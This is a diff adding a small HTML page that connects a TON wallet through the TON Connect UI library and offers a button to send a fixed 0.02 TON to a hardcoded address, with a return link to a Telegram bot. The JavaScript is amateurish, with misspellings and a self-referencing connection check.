@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TON Connect</title>
+    <!-- TON Connect UI library -->
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+
+    <!-- Custom Styles -->
+    <link rel="stylesheet" href="tonconnect.css" />
+
+    <style>
+      body {
+        margin: 0;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #f4f4f4; /* optional background color */
+      }
+
+      #ton-connect {
+        text-align: center;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div id="ton-connect"></div>
+    <button id="sendTransactionBtn" class="tranfer">SEND TON</button>
+    <button id="connectWalletBtn" class="" hidden>connect wallet</button>
+
+    <script>
+      let isWallectConnected = false;
+      let tonConnectUI = null;
+
+      document.addEventListener("DOMContentLoaded", async function () {
+        tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+          manifestUrl:
+            "https://curious-kulfi-94dca2.netlify.app/tonconnect-manifest.json",
+          buttonRootId: "ton-connect",
+        });
+
+        // Set the Telegram return URL
+        tonConnectUI.uiOptions = {
+          twaReturnUrl: "https://t.me/TonReward_Bot",
+        };
+
+        //check if wallect is connected
+
+        const connectedWallet = await tonConnectUI.getWallets();
+        if (connectedWallet) {
+          isWallectConnected = true;
+          console.log("CONNECTED: ", connectedWallet);
+        }
+      });
+
+      //connect wallet btn
+
+      async function connectedWallet() {
+        if (connectedWallet) {
+          isWallectConnected = true;
+          console.log("wallect connected", connectedWallet);
+          return;
+        }
+
+        try {
+          const connectedWallet = await tonConnectUI.connectedWallet();
+          if (connectedWallet) {
+            isWallectConnected = true;
+            console.log("wallected connected", connectedWallet);
+          }
+        } catch (error) {
+          console.error("Error connecting to wallect", error);
+        }
+      }
+
+      async function sendTonTransaction() {
+        if (!tonConnectUI) {
+          console.error("please connect your wallet");
+          return;
+        }
+
+        const transaction = {
+          messages: [
+            {
+              address: "EQBBJBB3HagsujBqVfqeDUPJ0kXjgTPLWPFFffuNXNiJL0aA", // destination address
+              amount: "20000000", //Toncoin in nanotons
+            },
+          ],
+        };
+
+        try {
+          const result = await tonConnectUI.sendTransaction(transaction);
+          console.log("transaction sucessful", result);
+        } catch (error) {
+          console.error("Transation failed", error);
+        }
+      }
+
+      // Button event listeners
+      document
+        .getElementById("connectWalletBtn")
+        .addEventListener("click", connectedWallet);
+
+      document
+        .getElementById("sendTransactionBtn")
+        .addEventListener("click", sendTonTransaction);
+    </script>
+  </body>
+</html>
